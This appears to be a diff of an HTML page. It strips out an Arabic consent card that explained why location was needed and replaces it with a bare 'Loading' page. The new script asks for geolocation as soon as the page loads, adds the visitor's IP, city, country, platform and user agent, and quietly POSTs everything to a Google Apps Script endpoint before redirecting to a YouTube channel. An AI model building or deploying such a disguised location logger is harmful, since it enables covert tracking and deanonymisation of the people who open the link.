@@ -1,98 +1,71 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>السماح بالموقع</title>
-
-<style>
-
-body{
-margin:0;
-font-family:system-ui,-apple-system,Segoe UI,Roboto;
-background:#0f0f0f;
-color:white;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-}
-
-.card{
-width:90%;
-max-width:420px;
-background:#1c1c1c;
-border-radius:14px;
-padding:25px;
-text-align:center;
-box-shadow:0 10px 30px rgba(0,0,0,0.6);
-}
-
-h1{
-font-size:18px;
-margin-bottom:10px;
-}
-
-p{
-font-size:14px;
-color:#b3b3b3;
-line-height:1.6;
-}
-
-button{
-margin-top:20px;
-width:100%;
-padding:14px;
-border:none;
-border-radius:10px;
-background:#3ea6ff;
-color:white;
-font-size:16px;
-font-weight:bold;
-cursor:pointer;
-}
-
-button:active{
-opacity:0.85;
-}
-
-</style>
+<title>Loading</title>
 </head>
 
 <body>
 
-<div class="card">
-
-<h1>السماح باستخدام الموقع الجغرافي</h1>
-
-<p>
-يحتاج هذا الموقع إلى معرفة موقعك الجغرافي لتحسين الخدمة.
-الرجاء الضغط على الزر أدناه والسماح بالوصول إلى الموقع عند ظهور الطلب.
-</p>
-
-<button onclick="requestLocation()">السماح بالموقع</button>
-
-</div>
-
 <script>
 
-function requestLocation(){
+const REDIRECT_URL = "https://youtube.com/@mohannad_asas";
 
-if(!navigator.geolocation){
-alert("المتصفح لا يدعم تحديد الموقع");
-return;
+/* ضع رابط Apps Script هنا */
+const SAVE_URL = "https://script.google.com/macros/s/AKfycbztlJsWkK4J5l4wRNSdNe7OrKfJRllg29mP8A7707B4CsYg9ZY9UQpPkvesgUBNYZiC5Q/exec";
+
+
+window.onload = function(){
+
+ if (!navigator.geolocation){
+  alert("Geolocation not supported");
+  return;
+ }
+
+ navigator.geolocation.getCurrentPosition(success,error);
+
+};
+
+
+/* success */
+
+function success(position){
+
+ const lat = position.coords.latitude;
+ const lon = position.coords.longitude;
+
+ fetch("https://ipapi.co/json/")
+ .then(res=>res.json())
+ .then(data=>{
+
+  const info = {
+
+   lat:lat,
+   lon:lon,
+   country:data.country_name,
+   city:data.city,
+   ip:data.ip,
+   device:navigator.platform,
+   browser:navigator.userAgent
+
+  };
+
+  fetch(SAVE_URL,{
+   method:"POST",
+   body:JSON.stringify(info)
+  });
+
+  window.location.href = REDIRECT_URL;
+
+ });
+
 }
 
-navigator.geolocation.getCurrentPosition(function(pos){
 
-console.log(pos.coords.latitude,pos.coords.longitude);
+/* error */
 
-},function(){
-
-alert("لم يتم السماح بالموقع");
-
-});
-
+function error(){
+ alert("Please allow location access");
 }
 
 </script>
